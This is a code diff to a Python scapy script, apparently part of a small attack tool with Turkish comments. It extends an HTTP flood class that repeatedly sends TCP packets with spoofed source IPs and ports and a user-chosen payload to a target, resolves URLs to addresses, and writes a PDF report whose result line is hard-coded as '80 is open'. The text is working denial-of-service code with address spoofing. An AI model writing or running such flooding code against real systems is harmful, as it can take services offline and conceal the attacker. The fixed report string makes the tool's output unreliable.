@@ -1,6 +1,9 @@
+# -*- coding: utf-8 -*-
+
 import random
 from scapy.all import *
 import socket
+from createPDF import *
 
 
 def SpoofIP():
@@ -19,17 +22,28 @@ def isAlive(dst,port):
 
 
 class HTTPFlood():
-	def __init__(self,dst,port,flag,count):
-		self.dst ,self.port , self.flag ,self.count = dst ,port , flag , count
+	def __init__(self,dst,port,flag,payload,count):
+		#View'den gelen degiskenlerin atamaları yapılıyor
+		self.dst ,self.port , self.flag ,self.payload ,self.count = \
+			dst ,port , flag ,payload, count
+
+		if str(self.dst).startswith("http"):
+			#[:-1] -> burada çoğu linkte olan / kaldırmak için kullandım
+			tmp = str(self.dst).split("/")[2]
+			self.dst = socket.gethostbyname(tmp)
+
 	def Start(self):
 		for i in range(int(self.count)):
 			self.Attack()
-		isAlive(self.dst, self.port)
+
+		CreatePDF("Http Flood","80 is open")
+
+		#isAlive fonksiyonu çalıştırılarak hedefin live olup olmadığı bilgisi dönüyor
+		#isAlive(self.dst, self.port)
 
 	def Attack(self):
 		src_ip = SpoofIP()
 		src_port = SpoofPort()
 		network_layer = IP(src=src_ip, dst=self.dst)
 		transport_layer = TCP(sport=int(src_port), dport=int(self.port), flags=str(self.flag))
-		data = "This is sample"
-		send(network_layer / transport_layer / Raw(load=data), verbose=False)
+		send(network_layer / transport_layer / Raw(load=self.payload), verbose=False)
